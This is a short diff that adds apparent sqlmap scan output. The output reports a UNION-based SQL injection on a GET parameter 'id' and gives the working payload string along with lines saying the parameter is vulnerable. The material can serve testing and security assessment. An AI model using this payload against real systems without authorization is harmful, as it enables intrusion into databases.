@@ -1,0 +1,10 @@
+sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 to 10 columns
+    Payload: id=1' UNION ALL SELECT NULL,NULL-- -
+---
+
+[INFO] parameter 'id' appears to be injectable
+[INFO] parameter 'id' is vulnerable
